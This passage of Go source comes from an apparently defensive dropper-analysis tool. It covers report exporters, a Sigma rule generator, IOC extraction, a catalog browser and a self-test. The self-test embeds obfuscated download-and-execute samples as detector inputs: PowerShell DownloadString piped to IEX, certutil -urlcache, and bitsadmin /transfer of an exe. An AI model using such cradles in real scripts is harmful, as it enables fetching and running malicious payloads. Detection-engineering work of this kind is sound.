		if f.Evidence != "" {
			b.WriteString("    Evidence  : " + f.Evidence + "\n")
		}
		if f.Detail != "" {
			b.WriteString("    Detail    : " + f.Detail + "\n")
		}
		if f.Detection != "" {
			b.WriteString("    Detection : " + f.Detection + "\n")
		}
		if len(f.Refs) > 0 {
			b.WriteString("    Refs      : " + strings.Join(f.Refs, ", ") + "\n")
		}
		b.WriteString("    Fingerprint: " + f.Fprint + "\n\n")
	}
	if len(r.Findings) == 0 {
		b.WriteString("No findings.\n")
	}
	return b.String()
}

func exportMD(r Report) string {
	var b strings.Builder
	b.WriteString("# OWL " + r.Tool + "\n\n")
	b.WriteString("*" + r.Tagline + "*\n\n")
	b.WriteString("| Field | Value |\n|---|---|\n")
	b.WriteString("| Version | " + r.Version + " |\n")
	b.WriteString("| Generated | " + r.Generated + " |\n")
	if r.Target != "" {
		b.WriteString("| Target | " + r.Target + " |\n")
	}
	b.WriteString("| Mode | " + r.Mode + " |\n")
	b.WriteString("| Primary MITRE | " + r.MitrePrime + " |\n")
	b.WriteString("| Grade | **" + r.Grade + "** (score " + strconv.Itoa(r.Score) + ") |\n")
	b.WriteString("| Summary | " + r.Summary + " |\n\n")
	b.WriteString("## Findings\n\n")
	if len(r.Findings) == 0 {
		b.WriteString("_No findings._\n")
		return b.String()
	}
	b.WriteString("| # | Severity | Title | MITRE | Location | Evidence |\n")
	b.WriteString("|---|---|---|---|---|---|\n")
	for i, f := range r.Findings {
		loc := ""
		if f.File != "" {
			loc = fmt.Sprintf("%s:%d", f.File, f.Line)
		}
		ev := strings.ReplaceAll(f.Evidence, "|", "\\|")
		if len(ev) > 60 {
			ev = ev[:60] + "…"
		}
		b.WriteString(fmt.Sprintf("| %d | %s | %s | %s | %s | %s |\n", i+1, strings.ToUpper(f.Severity), f.Title, f.Technique, loc, ev))
	}
	b.WriteString("\n### Detail\n\n")
	for i, f := range r.Findings {
		b.WriteString(fmt.Sprintf("#### %d. %s (%s)\n\n", i+1, f.Title, strings.ToUpper(f.Severity)))
		b.WriteString("- Rule: `" + f.RuleID + "`\n")
		b.WriteString("- MITRE: " + f.Technique + " / " + f.Tactic + "\n")
		if f.Detail != "" {
			b.WriteString("- Detail: " + f.Detail + "\n")
		}
		if f.Detection != "" {
			b.WriteString("- Detection: " + f.Detection + "\n")
		}
		if len(f.Refs) > 0 {
			b.WriteString("- Refs: " + strings.Join(f.Refs, ", ") + "\n")
		}
		b.WriteString("\n")
	}
	return b.String()
}

func exportJSON(r Report) string {
	buf, err := json.MarshalIndent(r, "", "  ")
	if err != nil {
		return "{}"
	}
	return string(buf)
}

func exportCSV(r Report) string {
	var buf bytes.Buffer
	w := csv.NewWriter(&buf)
	w.Write([]string{"index", "severity", "score", "ruleId", "title", "tactic", "technique", "file", "line", "evidence", "detection", "fingerprint"})
	for i, f := range r.Findings {
		w.Write([]string{
			strconv.Itoa(i + 1), f.Severity, strconv.Itoa(f.Score), f.RuleID, f.Title,
			f.Tactic, f.Technique, f.File, strconv.Itoa(f.Line), f.Evidence, f.Detection, f.Fprint,
		})
	}
	w.Flush()
	return buf.String()
}

// SARIF 2.1.0 structures (minimal, valid)
type sarifLog struct {
	Schema  string     `json:"$schema"`
	Version string     `json:"version"`
	Runs    []sarifRun `json:"runs"`
}
type sarifRun struct {
	Tool    sarifTool     `json:"tool"`
	Results []sarifResult `json:"results"`
}
type sarifTool struct {
	Driver sarifDriver `json:"driver"`
}
type sarifDriver struct {
	Name           string      `json:"name"`
	Version        string      `json:"version"`
	InformationURI string      `json:"informationUri"`
	Rules          []sarifRule `json:"rules"`
}
type sarifRule struct {
	ID               string            `json:"id"`
	Name             string            `json:"name"`
	ShortDescription sarifText         `json:"shortDescription"`
	FullDescription  sarifText         `json:"fullDescription"`
	HelpURI          string            `json:"helpUri,omitempty"`
	Properties       map[string]string `json:"properties,omitempty"`
}
type sarifText struct {
	Text string `json:"text"`
}
type sarifResult struct {
	RuleID    string            `json:"ruleId"`
	Level     string            `json:"level"`
	Message   sarifText         `json:"message"`
	Locations []sarifLocation   `json:"locations,omitempty"`
	Fprints   map[string]string `json:"fingerprints,omitempty"`
	Props     map[string]string `json:"properties,omitempty"`
}
type sarifLocation struct {
	PhysicalLocation sarifPhysical `json:"physicalLocation"`
}
type sarifPhysical struct {
	ArtifactLocation sarifArtifact `json:"artifactLocation"`
	Region           *sarifRegion  `json:"region,omitempty"`
}
type sarifArtifact struct {
	URI string `json:"uri"`
}
type sarifRegion struct {
	StartLine int `json:"startLine"`
}

func sarifLevel(sev string) string {
	switch strings.ToLower(sev) {
	case "critical", "high":
		return "error"
	case "medium":
		return "warning"
	default:
		return "note"
	}
}

func exportSARIF(r Report) string {
	ruleSet := map[string]sarifRule{}
	var results []sarifResult
	for _, f := range r.Findings {
		if _, ok := ruleSet[f.RuleID]; !ok {
			ruleSet[f.RuleID] = sarifRule{
				ID:               f.RuleID,
				Name:             f.Title,
				ShortDescription: sarifText{Text: f.Title},
				FullDescription:  sarifText{Text: f.Detail},
				HelpURI:          "https://owlsec.org/" + strings.ToLower(APPNAME),
				Properties:       map[string]string{"tactic": f.Tactic, "technique": f.Technique, "severity": f.Severity},
			}
		}
		res := sarifResult{
			RuleID:  f.RuleID,
			Level:   sarifLevel(f.Severity),
			Message: sarifText{Text: f.Title + ": " + f.Detail},
			Fprints: map[string]string{"owl/v1": f.Fprint},
			Props:   map[string]string{"severity": f.Severity, "technique": f.Technique},
		}
		if f.File != "" {
			reg := &sarifRegion{StartLine: f.Line}
			if f.Line <= 0 {
				reg = nil
			}
			res.Locations = []sarifLocation{{PhysicalLocation: sarifPhysical{ArtifactLocation: sarifArtifact{URI: f.File}, Region: reg}}}
		}
		results = append(results, res)
	}
	var rules []sarifRule
	for _, v := range ruleSet {
		rules = append(rules, v)
	}
	sort.Slice(rules, func(i, j int) bool { return rules[i].ID < rules[j].ID })
	log := sarifLog{
		Schema:  "https://json.schemastore.org/sarif-2.1.0.json",
		Version: "2.1.0",
		Runs: []sarifRun{{
			Tool: sarifTool{Driver: sarifDriver{
				Name:           "OWL-" + APPNAME,
				Version:        VERSION,
				InformationURI: "https://owlsec.org",
				Rules:          rules,
			}},
			Results: results,
		}},
	}
	buf, _ := json.MarshalIndent(log, "", "  ")
	return string(buf)
}

// renderReport selects a format.
func renderReport(r Report, format string) string {
	switch strings.ToLower(format) {
	case "md", "markdown":
		return exportMD(r)
	case "json":
		return exportJSON(r)
	case "csv":
		return exportCSV(r)
	case "sarif":
		return exportSARIF(r)
	default:
		return exportTXT(r)
	}
}

// writeOut writes rendered output to a file or stdout.
func writeOut(content, path string) error {
	if path == "" {
		fmt.Print(content)
		if !strings.HasSuffix(content, "\n") {
			fmt.Println()
		}
		return nil
	}
	return os.WriteFile(path, []byte(content), 0644)
}

// ====================================================================
//  HOW TO USE SCREEN  (mandatory — menu item + --howto flag)
// ====================================================================

type HowtoSection struct {
	Title string
	Lines []string
}

var howtoSections = []HowtoSection{
	{Title: "LEGAL & ETHICAL WARNING", Lines: []string{
		"ODropper is for AUTHORIZED security testing, detection engineering and education ONLY.",
		"Use it exclusively on systems, files and logs you own or are explicitly permitted",
		"in writing to assess. Unauthorized use of the techniques catalogued here may be a crime.",
		"This tool is an OFFLINE analyzer / planner / catalog: it does NOT launch live attacks",
		"against third-party systems. You are solely responsible for staying in scope.",
	}},
	{Title: "HOW TO USE", Lines: []string{
		"1. Browse the catalog for techniques, markers, detection and MITRE mapping.",
		"2. Collect authorized offline inputs (configs, logs, captures, dumps).",
		"3. Run: ODropper --scan sample.ps1 --layers --format sarif --output out.sarif",
		"4. Binaries are handled too: ASCII + UTF-16 strings are extracted first.",
		"5. Use 'MITRE technique index' to pivot by technique.",
		"6. Export findings as txt|md|json|csv|sarif; generate Sigma via --sigma.",
	}},
	{Title: "REQUIREMENTS", Lines: []string{
		"- Offline analyzer/planner; Go stdlib only; no live attacks.",
		"- Authorized testing only; written permission required.",
		"- Inputs are text configs, logs, or synthetic lab samples.",
	}},
	{Title: "FEATURE / PROTOCOL NOTES", Lines: []string{
		"Decodes -EncodedCommand, base64, hex/\\x, char-code arrays and string concatenation (3 levels).",
		"One marker of a multi-marker technique is a weak signal; full severity needs two.",
		"Download + execute primitives together raise a kill-chain finding (CRITICAL with evasion).",
		"Catalog spans macro/HTA/LNK/ISO/LOLBin/reflective droppers.",
		"Benign lab analysis — does not fetch remote payloads.",
	}},
}

// showHowto renders the HOW TO USE screen.
func showHowto() {
	clear()
	banner()
	sectionHeader("How To Use — " + APPNAME)
	for _, s := range howtoSections {
		fmt.Println()
		fmt.Println("  " + col("» "+s.Title, CY+B))
		for _, ln := range s.Lines {
			if ln == "" {
				fmt.Println()
				continue
			}
			fmt.Println("    " + col(ln, W))
		}
	}
	line(64)
	fmt.Println("  " + col("Primary MITRE mapping: ", DIM) + col(PRIMARY_MITRE, CY))
	fmt.Println("  " + col("Authorized testing only — see LEGAL & ETHICAL WARNING above.", GY))
}

// howtoText returns the HOW TO USE content as plain text (for --howto).
func howtoText() string {
	var b strings.Builder
	b.WriteString("OWL " + APPNAME + " — HOW TO USE\n")
	b.WriteString(TAGLINE + "\n")
	b.WriteString(strings.Repeat("=", 72) + "\n")
	for _, s := range howtoSections {
		b.WriteString("\n## " + s.Title + "\n")
		for _, ln := range s.Lines {
			b.WriteString("  " + ln + "\n")
		}
	}
	b.WriteString("\nPrimary MITRE mapping: " + PRIMARY_MITRE + "\n")
	return b.String()
}

// ====================================================================
//  CATALOG BROWSER (shared interactive + CLI views)
// ====================================================================

// printCatalogTable prints a compact table of entries.
func printCatalogTable(entries []CatalogEntry) {
	if len(entries) == 0 {
		warnMsg("No catalog entries match.")
		return
	}
	rows := [][]string{}
	for _, e := range entries {
		rows = append(rows, []string{e.ID, trunc(e.Name, 34), e.Platform, strings.ToUpper(e.Severity), e.Technique})
	}
	table([]string{"ID", "NAME", "PLATFORM", "SEV", "MITRE"}, rows)
	fmt.Println()
	info(fmt.Sprintf("%d entr%s.", len(entries), plural(len(entries))))
}

func plural(n int) string {
	if n == 1 {
		return "y"
	}
	return "ies"
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "…"
}

// showEntry prints a full catalog entry card.
func showEntry(e CatalogEntry) {
	fmt.Println()
	fmt.Println("  " + col("╭─ "+e.ID+" — "+e.Name, CY+B))
	fmt.Println("  " + col("│ Category : ", DR) + col(e.Category, W))
	fmt.Println("  " + col("│ Platform : ", DR) + col(e.Platform, W))
	fmt.Println("  " + col("│ Severity : ", DR) + col(strings.ToUpper(e.Severity), sevColor(e.Severity)))
	fmt.Println("  " + col("│ Tactic   : ", DR) + col(e.Tactic, W))
	fmt.Println("  " + col("│ Technique: ", DR) + col(e.Technique, W))
	fmt.Println("  " + col("╰─", DR))
	fmt.Println("  " + col("Summary: ", R+B) + col(e.Summary, W))
	if e.Detail != "" {
		fmt.Println()
		for _, ln := range wrap(e.Detail, 78) {
			fmt.Println("    " + col(ln, GY))
		}
	}
	if len(e.Commands) > 0 {
		fmt.Println()
		fmt.Println("  " + col("Example / reference commands:", CY+B))
		for _, c := range e.Commands {
			fmt.Println("    " + col("$ ", DR) + col(c, W))
		}
	}
	if len(e.Markers) > 0 {
		fmt.Println()
		fmt.Println("  " + col("Scan markers (regex):", CY+B))
		for _, m := range e.Markers {
			fmt.Println("    " + col(m, YLW))
		}
	}
	if len(e.Detection) > 0 {
		fmt.Println()
		fmt.Println("  " + col("Detection guidance:", CY+B))
		for _, d := range e.Detection {
			fmt.Println("    " + col("• "+d, W))
		}
	}
	if len(e.Refs) > 0 {
		fmt.Println()
		fmt.Println("  " + col("References: ", DIM) + col(strings.Join(e.Refs, "  "), GY))
	}
}

// wrap wraps text to a width.
func wrap(s string, width int) []string {
	words := strings.Fields(s)
	var lines []string
	var cur string
	for _, w := range words {
		if cur == "" {
			cur = w
		} else if len(cur)+1+len(w) <= width {
			cur += " " + w
		} else {
			lines = append(lines, cur)
			cur = w
		}
	}
	if cur != "" {
		lines = append(lines, cur)
	}
	return lines
}

// ====================================================================
//  GENERIC PLANNER (catalog -> prioritized action plan)
// ====================================================================

// genericDemo runs a synthetic self-contained scan over an embedded sample.
func genericDemo() {
	clear()
	banner()
	sectionHeader("Demo — Synthetic Self-Contained Run")
	res := analyzeSample("demo-stager.vba", []byte(demoSample()), true)
	res.Report.Mode = "demo"
	showAnalysis(res)
	fmt.Println()
	sectionHeader("Decoded layers")
	printLayers(res, 400)
}

// printFindings prints a report's findings + grade to the TUI.
func printFindings(rep Report) {
	if len(rep.Findings) == 0 {
		okMsg("No findings in this run.")
	} else {
		rows := [][]string{}
		for i, f := range rep.Findings {
			loc := f.File
			if f.Line > 0 {
				loc = fmt.Sprintf("%s:%d", f.File, f.Line)
			}
			rows = append(rows, []string{strconv.Itoa(i + 1), strings.ToUpper(f.Severity), trunc(f.Title, 40), f.Technique, loc})
		}
		table([]string{"#", "SEV", "FINDING", "MITRE", "LOC"}, rows)
	}
	fmt.Println()
	gradeLineOut(rep)
}

func gradeLineOut(rep Report) {
	fmt.Println("  " + col("Grade : ", CY+B) + col(rep.Grade, sevColorForGrade(rep.Grade)+B) + col("  score "+strconv.Itoa(rep.Score), GY))
	fmt.Println("  " + col(gradeExplain(rep.Grade), GY))
	fmt.Println("  " + col(rep.Summary, W))
}

func sevColorForGrade(g string) string {
	switch g {
	case "A+", "A":
		return GRN
	case "B", "C":
		return YLW
	default:
		return R
	}
}

// ====================================================================
//  IOC EXTRACTOR + TIMELINE + FINDING MERGE UTILITIES
// ====================================================================

// extractIOCs pulls IPv4, URLs, emails, and Windows paths from text.
func extractIOCs(text string) (ips, urls, emails, paths []string) {
	ipRe := regexp.MustCompile(`\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b`)
	urlRe := regexp.MustCompile(`https?://[^\s"'<>]{4,}`)
	emRe := regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
	pathRe := regexp.MustCompile(`(?i)(?:[A-Za-z]:\\|\\\\|/var/|/tmp/|/etc/|/home/|/usr/)[^\s"'<>]{2,}`)
	seen := map[string]bool{}
	add := func(list *[]string, v string) {
		if seen[v] {
			return
		}
		seen[v] = true
		*list = append(*list, v)
	}
	for _, m := range ipRe.FindAllString(text, 50) {
		add(&ips, m)
	}
	for _, m := range urlRe.FindAllString(text, 50) {
		add(&urls, trunc(m, 160))
	}
	for _, m := range emRe.FindAllString(text, 50) {
		add(&emails, m)
	}
	for _, m := range pathRe.FindAllString(text, 50) {
		add(&paths, trunc(m, 120))
	}
	return
}

// iocsToFindings converts extracted IOCs into Finding records.
func iocsToFindings(src string, ips, urls, emails, paths []string) []Finding {
	var fs []Finding
	for _, v := range ips {
		fs = append(fs, Finding{RuleID: "IOC-IP", Title: "IPv4 address", Severity: "info",
			Score: 1, Tactic: "Discovery", Technique: "T1016", File: src, Evidence: v,
			Detail: "Extracted IPv4 indicator.", Fprint: fingerprint("ip", v)})
	}
	for _, v := range urls {
		fs = append(fs, Finding{RuleID: "IOC-URL", Title: "URL", Severity: "info",
			Score: 1, Tactic: "Command and Control", Technique: "T1071", File: src, Evidence: v,
			Detail: "Extracted URL indicator.", Fprint: fingerprint("url", v)})
	}
	for _, v := range emails {
		fs = append(fs, Finding{RuleID: "IOC-EMAIL", Title: "Email address", Severity: "info",
			Score: 1, Tactic: "Initial Access", Technique: "T1566", File: src, Evidence: v,
			Detail: "Extracted email indicator.", Fprint: fingerprint("em", v)})
	}
	for _, v := range paths {
		fs = append(fs, Finding{RuleID: "IOC-PATH", Title: "Filesystem path", Severity: "info",
			Score: 1, Tactic: "Discovery", Technique: "T1083", File: src, Evidence: v,
			Detail: "Extracted path indicator.", Fprint: fingerprint("path", v)})
	}
	return fs
}

// mergeFindings concatenates and de-duplicates findings by fingerprint.
func mergeFindings(sets ...[]Finding) []Finding {
	seen := map[string]bool{}
	var out []Finding
	for _, set := range sets {
		for _, f := range set {
			key := f.Fprint
			if key == "" {
				key = fingerprint(f.RuleID, f.Title, f.Evidence, strconv.Itoa(f.Line))
			}
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, f)
		}
	}
	sortFindings(out)
	return out
}

// ====================================================================
//  ATT&CK COVERAGE MATRIX
// ====================================================================

// attackCoverage prints a tactic x technique coverage matrix derived from
// the catalog, useful for detection-engineering gap analysis.
func attackCoverage() {
	clear()
	banner()
	sectionHeader("ATT&CK Coverage Matrix")
	byTactic := map[string][]string{}
	techSeverity := map[string]string{}
	for _, e := range catalog {
		tac := e.Tactic
		if tac == "" {
			tac = "(unmapped)"
		}
		byTactic[tac] = append(byTactic[tac], e.Technique)
		if sevRank[strings.ToLower(e.Severity)] > sevRank[strings.ToLower(techSeverity[e.Technique])] {
			techSeverity[e.Technique] = e.Severity
		}
	}
	var tacs []string
	for k := range byTactic {
		tacs = append(tacs, k)
	}
	sort.Strings(tacs)
	rows := [][]string{}
	for _, tac := range tacs {
		uniq := uniqueSorted(byTactic[tac])
		rows = append(rows, []string{trunc(tac, 34), strconv.Itoa(len(byTactic[tac])), strconv.Itoa(len(uniq)), trunc(strings.Join(uniq, ","), 40)})
	}
	table([]string{"TACTIC", "ENTRIES", "TECHNIQUES", "IDS"}, rows)
	fmt.Println()
	info(fmt.Sprintf("%d distinct techniques across %d tactics.", len(techSeverity), len(tacs)))
}

// uniqueSorted returns a deduplicated, sorted copy of a string slice.
func uniqueSorted(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

// attackCoverageText returns the coverage matrix as plain text (CLI).
func attackCoverageText() string {
	byTactic := map[string]int{}
	byTech := map[string]bool{}
	for _, e := range catalog {
		tac := e.Tactic
		if tac == "" {
			tac = "(unmapped)"
		}
		byTactic[tac]++
		byTech[e.Technique] = true
	}
	var b strings.Builder
	b.WriteString(APPNAME + " ATT&CK coverage: " + strconv.Itoa(len(byTech)) + " techniques\n")
	var tacs []string
	for k := range byTactic {
		tacs = append(tacs, k)
	}
	sort.Strings(tacs)
	for _, tac := range tacs {
		b.WriteString(fmt.Sprintf("  %-40s %d\n", tac, byTactic[tac]))
	}
	return b.String()
}

// ====================================================================
//  SIGMA-STYLE DETECTION RULE GENERATOR
// ====================================================================

// yamlEscape quotes a string for a simple inline YAML scalar.
func yamlEscape(s string) string {
	if s == "" {
		return "''"
	}
	if strings.ContainsAny(s, ":#{}[],&*?|<>=!%@") || strings.Contains(s, "\\") || strings.Contains(s, "\"") || strings.Contains(s, "'") {
		return "'" + strings.ReplaceAll(s, "'", "''") + "'"
	}
	return s
}

// generateSigma turns catalog entries into Sigma-like detection rules.
// The output is a best-effort Sigma skeleton for blue-team use; markers
// become CommandLine regex conditions. It is a generator, not a validator.
func generateSigma() string {
	var b strings.Builder
	for _, e := range catalog {
		if len(e.Markers) == 0 {
			continue
		}
		b.WriteString("title: " + yamlEscape(APPNAME+" - "+e.Name) + "\n")
		b.WriteString("id: " + fingerprint("sigma", APPNAME, e.ID) + "\n")
		b.WriteString("status: experimental\n")
		b.WriteString("description: " + yamlEscape(e.Summary) + "\n")
		b.WriteString("references:\n")
		for _, r := range e.Refs {
			b.WriteString("  - " + yamlEscape(r) + "\n")
		}
		b.WriteString("author: khaled.s.haddad (owlsec.org)\n")
		b.WriteString("tags:\n")
		b.WriteString("  - attack." + strings.ToLower(strings.ReplaceAll(tacticName(e.Tactic), " ", "_")) + "\n")
		if e.Technique != "" {
			b.WriteString("  - attack." + strings.ToLower(e.Technique) + "\n")
		}
		b.WriteString("logsource:\n")
		b.WriteString("  category: process_creation\n")
		if e.Platform == "windows" || e.Platform == "linux" || e.Platform == "macos" {
			b.WriteString("  product: " + e.Platform + "\n")
		}
		b.WriteString("detection:\n")
		b.WriteString("  selection:\n")
		b.WriteString("    CommandLine|re:\n")
		for _, m := range e.Markers {
			b.WriteString("      - " + yamlEscape(m) + "\n")
		}
		b.WriteString("  condition: selection\n")
		b.WriteString("level: " + sigmaLevel(e.Severity) + "\n")
		b.WriteString("---\n")
	}
	return b.String()
}

func sigmaLevel(sev string) string {
	switch strings.ToLower(sev) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	case "medium":
		return "medium"
	case "low":
		return "low"
	default:
		return "informational"
	}
}

// menuSigma shows generated Sigma rules and offers to export them.
func menuSigma() {
	clear()
	banner()
	sectionHeader("Detection Rules (Sigma-Style)")
	rules := generateSigma()
	count := strings.Count(rules, "---\n")
	info(fmt.Sprintf("Generated %d Sigma-style rule(s) from the catalog markers.", count))
	preview := rules
	if len(preview) > 1400 {
		preview = preview[:1400] + "\n... (truncated preview) ..."
	}
	fmt.Println(col(preview, GY))
	fmt.Println()
	if out := prompt("export to file? (path or blank)"); out != "" {
		if err := os.WriteFile(out, []byte(rules), 0644); err != nil {
			errMsg(err.Error())
		} else {
			okMsg("Wrote Sigma rules to " + out)
		}
	}
	pause()
}

// ====================================================================
//  TOOL-SPECIFIC EXTRA ENGINE
// ====================================================================

func menuShowMitre() {
	clear()
	banner()
	sectionHeader("MITRE Technique Index")
	by := map[string][]CatalogEntry{}
	for _, e := range catalog {
		by[e.Technique] = append(by[e.Technique], e)
	}
	var keys []string
	for k := range by {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	rows := [][]string{}
	for _, k := range keys {
		rows = append(rows, []string{k, strconv.Itoa(len(by[k])), trunc(by[k][0].Name, 40), by[k][0].Severity})
	}
	table([]string{"TECHNIQUE", "N", "EXAMPLE", "SEV"}, rows)
	pause()
}
func init() {
	planReportFn = func() Report {
		entries := append([]CatalogEntry{}, catalog...)
		sort.SliceStable(entries, func(i, j int) bool {
			return sevRank[strings.ToLower(entries[i].Severity)] > sevRank[strings.ToLower(entries[j].Severity)]
		})
		return buildReport("plan", "catalog", entriesToFindings(entries))
	}
}

// ====================================================================
//  DEMO SAMPLE + PLAN REPORT (hooks; tools may override planReportFn)
// ====================================================================

// planReportFn lets a tool supply a custom planner report for CLI --plan.
var planReportFn = defaultPlanReport

// planReport returns the planner report for the CLI --plan path.
func planReport() Report { return planReportFn() }

// defaultPlanReport ranks the catalog by severity into a plan report.
func defaultPlanReport() Report {
	entries := append([]CatalogEntry{}, catalog...)
	sort.SliceStable(entries, func(i, j int) bool {
		return sevRank[strings.ToLower(entries[i].Severity)] > sevRank[strings.ToLower(entries[j].Severity)]
	})
	return buildReport("plan", "catalog", entriesToFindings(entries))
}

// ====================================================================
//  DEMO SAMPLE + runDemo/runPlan dispatch
// ====================================================================

func runDemo() {
	genericDemo()
}

// ====================================================================
//  INTERACTIVE TUI
// ====================================================================

func interactiveBrowse() {
	for {
		sel := strings.TrimLeft(menu("Catalog browser", []menuItem{
			{"01", "List all", "Every technique in the catalog", CY + B},
			{"02", "Search", "Free-text search across entries", CY + B},
			{"03", "By category", "Filter by category", CY + B},
			{"04", "By platform", "Filter by platform", CY + B},
			{"05", "Show entry by ID", "Full card for one technique", CY + B},
		}), "0")
		switch sel {
		case "1":
			clear()
			banner()
			printCatalogTable(catalog)
			pause()
		case "2":
			q := prompt("query")
			clear()
			banner()
			printCatalogTable(searchCatalog(q))
			pause()
		case "3":
			cats := categories()
			fmt.Println()
			for i, c := range cats {
				fmt.Printf("   %s %s\n", col(fmt.Sprintf("[%d]", i+1), CY+B), col(c, W))
			}
			idx := prompt("category #")
			if n, err := strconv.Atoi(idx); err == nil && n >= 1 && n <= len(cats) {
				clear()
				banner()
				printCatalogTable(filterByCategory(cats[n-1]))
				pause()
			}
		case "4":
			ps := platforms()
			fmt.Println()
			for i, p := range ps {
				fmt.Printf("   %s %s\n", col(fmt.Sprintf("[%d]", i+1), CY+B), col(p, W))
			}
			idx := prompt("platform #")
			if n, err := strconv.Atoi(idx); err == nil && n >= 1 && n <= len(ps) {
				clear()
				banner()
				printCatalogTable(filterByPlatform(ps[n-1]))
				pause()
			}
		case "5":
			id := prompt("entry ID")
			if e, ok := catalogByID(id); ok {
				clear()
				banner()
				showEntry(e)
			} else {
				errMsg("No entry with ID " + id)
			}
			pause()
		case "", "q", "Q":
			return
		}
	}
}

func interactiveStats() {
	clear()
	banner()
	sectionHeader("Catalog Statistics")
	bySev := map[string]int{}
	byCat := map[string]int{}
	byPlat := map[string]int{}
	markerCount := 0
	for _, e := range catalog {
		bySev[strings.ToLower(e.Severity)]++
		byCat[e.Category]++
		byPlat[e.Platform]++
		markerCount += len(e.Markers)
	}
	info(fmt.Sprintf("Catalog entries : %d", len(catalog)))
	info(fmt.Sprintf("Scan markers    : %d", markerCount))
	info(fmt.Sprintf("Categories      : %d", len(byCat)))
	info(fmt.Sprintf("Platforms       : %d", len(byPlat)))
	fmt.Println()
	fmt.Println("  " + col("By severity:", CY+B))
	for _, s := range []string{"critical", "high", "medium", "low", "info"} {
		if bySev[s] > 0 {
			bar := strings.Repeat("█", bySev[s])
			fmt.Printf("    %-9s %s %d\n", s, col(bar, sevColor(s)), bySev[s])
		}
	}
	fmt.Println()
	fmt.Println("  " + col("By category:", CY+B))
	var cs []string
	for c := range byCat {
		cs = append(cs, c)
	}
	sort.Strings(cs)
	for _, c := range cs {
		fmt.Printf("    %-28s %d\n", c, byCat[c])
	}
}

func interactiveExport() {
	clear()
	banner()
	sectionHeader("Export Catalog / Last Report")
	rep := buildReport("catalog-dump", "catalog", catalogAsFindings())
	if lastAnalysis != nil {
		if strings.HasPrefix(strings.ToLower(prompt("export [L]ast analysis or [c]atalog? (blank = last)")), "c") == false {
			rep = lastAnalysis.Report
		}
	}
	f := prompt("format txt|md|json|csv|sarif")
	if f == "" {
		f = "txt"
	}
	out := prompt("output file (blank=stdout)")
	if err := writeOut(renderReport(rep, f), out); err != nil {
		errMsg(err.Error())
	} else {
		okMsg("Export complete.")
	}
	pause()
}

// catalogAsFindings turns the catalog into findings for a reference dump.
func catalogAsFindings() []Finding {
	var fs []Finding
	for _, e := range catalog {
		fs = append(fs, Finding{
			RuleID:    e.ID,
			Title:     e.Name,
			Severity:  e.Severity,
			Score:     sevWeight[strings.ToLower(e.Severity)],
			Tactic:    e.Tactic,
			Technique: e.Technique,
			Detail:    e.Summary,
			Detection: strings.Join(e.Detection, "; "),
			Refs:      e.Refs,
			Fprint:    fingerprint(e.ID),
		})
	}
	return fs
}

// ====================================================================
//  SELF-TEST
// ====================================================================

func runSelfTest() bool {
	banner()
	pass, fail := 0, 0
	check := func(n string, ok bool, got string) {
		if ok {
			okMsg(n)
			pass++
		} else {
			errMsg(n + "  →  " + got)
			fail++
		}
	}
	ids := func(r Report) map[string]string {
		m := map[string]string{}
		for _, f := range r.Findings {
			m[f.RuleID] = f.Severity
		}
		return m
	}
	// 1. the demo: macro → -EncodedCommand → download + Assembly.Load + VM check
	d := analyzeSample("demo", []byte(demoSample()), true)
	m := ids(d.Report)
	check("decodes PowerShell -EncodedCommand layer", d.Decoded >= 1, strconv.Itoa(d.Decoded))
	check("finds download cradle inside the decoded layer", m["DR-POWERSHELL"] == "high", m["DR-POWERSHELL"])
	check("finds in-memory .NET load inside the decoded layer", m["DR-DOTNET"] != "", fmt.Sprint(m))
	check("infers download→execute chain with evasion (CRITICAL)", m["DR-CHAIN"] == "critical", m["DR-CHAIN"])
	check("extracts URL IOC from decoded layer", len(d.IOCs["url"]) >= 1, fmt.Sprint(d.IOCs["url"]))
	// 2. benign text must not raise HIGH/CRITICAL (old version flagged these)
	benign := "# Install\nDownload the release from https://example.org/app.tar.gz and see https://example.org/docs\n" +
		"Stage 1: build. Stage 2: test. The payload url is documented below.\n" +
		"curl -L https://example.org/install.sh -o install.sh\nchmod +x install.sh\n" +
		"button.addEventListener('click', () => handler.call(this))\nimport requests\nr = requests.get(url)\n"
	b := analyzeSample("README.md", []byte(benign), false)
	worst := ""
	for _, f := range b.Report.Findings {
		if sevRank[f.Severity] >= sevRank["high"] {
			worst += f.RuleID + " "
		}
	}
	check("benign README/install notes stay below HIGH", worst == "", worst)
	// 3. obfuscation decoders
	cc := analyzeSample("cc.ps1", []byte("$x = [char]73+[char]69+[char]88+[char]40+[char]78+[char]101+[char]119+[char]45"), false)
	found := false
	for _, l := range cc.Layers {
		if strings.HasPrefix(l.Text, "IEX(New-") {
			found = true
		}
	}
	check("char-code array decoded", found, fmt.Sprint(len(cc.Layers)))
	hx := analyzeSample("hx.js", []byte(`var s="\x63\x65\x72\x74\x75\x74\x69\x6c\x20\x2d\x75\x72\x6c\x63\x61\x63\x68\x65\x20\x2d\x66\x20\x68\x74\x74\x70";`), false)
	check("\\x hex escapes decoded and scanned", ids(hx.Report)["DR-CERTUTIL"] != "", fmt.Sprint(ids(hx.Report)))
	cat := analyzeSample("c.ps1", []byte("(New-Object Net.WebClient).('Down'+'loadString')('http://x/a')|I`E`X"), false)
	check("string concatenation + backticks normalised", ids(cat.Report)["DR-POWERSHELL"] == "high", fmt.Sprint(ids(cat.Report)))
	// 4. binary: UTF-16 string inside a blob with NULs
	bin := []byte{0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0}
	for _, c := range []byte("bitsadmin /transfer j http://198.51.100.9/x.exe c:\\x.exe") {
		bin = append(bin, c, 0)
	}
	bin = append(bin, 0, 0, 0xff, 0xfe)
	bb := analyzeSample("x.exe", bin, false)
	check("binary: UTF-16LE strings extracted and matched", bb.Binary && ids(bb.Report)["DR-BITS"] != "", fmt.Sprint(bb.Binary, ids(bb.Report)))
	// 5. single marker of a multi-marker technique → weak signal
	w := analyzeSample("w.txt", []byte("the VirtualAlloc API reserves memory"), false)
